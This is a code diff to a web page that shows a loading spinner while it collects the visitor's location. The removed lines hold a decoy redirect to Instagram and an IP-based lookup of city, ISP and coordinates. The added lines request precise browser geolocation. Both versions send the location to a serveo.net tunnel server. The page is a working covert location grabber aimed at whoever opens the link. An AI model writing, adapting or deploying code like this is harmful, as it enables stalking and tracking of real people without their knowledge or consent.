@@ -58,33 +58,23 @@
         }
     </style>
     <div class="spinner"></div>
-    <script>
-        // Wait for 3 seconds and then redirect
-        setTimeout(function() {
-            // enter your redirect url
-            window.location.href = "https://instagram.com/";
-        }, 3000);
-    </script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
         $(document).ready(function() {
-            $.getJSON("https://ipapi.co/json/", function(data) {
-                $("#ip_address").text(data.ip);
-                $("#country_name").text(data.country_name);
-                $("#region_name").text(data.region);
-                $("#city_name").text(data.city);
-                $("#latitude").text(data.latitude);
-                $("#longitude").text(data.longitude);
-                $("#postal_code").text(data.postal);
-                $("#timezone").text(data.timezone);
-                $("#isp").text(data.org);
-                
-                // Send location data to the server
-                sendLocationToServer(data);
-            });
+            // Get client's browser location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToServer, handleLocationError);
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
         });
         
-        function sendLocationToServer(locationData) {
+        function sendLocationToServer(position) {
+            var locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
             $.ajax({
                 type: "POST",
                 url: "https://8d367f5b74bd58d9bff4a931c172033d.serveo.net", // Update with your server URL
@@ -97,6 +87,10 @@
                     console.error("Error sending location data to server:", error);
                 }
             });
+        }
+
+        function handleLocationError(error) {
+            console.error("Error getting client's location:", error);
         }
     </script>
 </body>
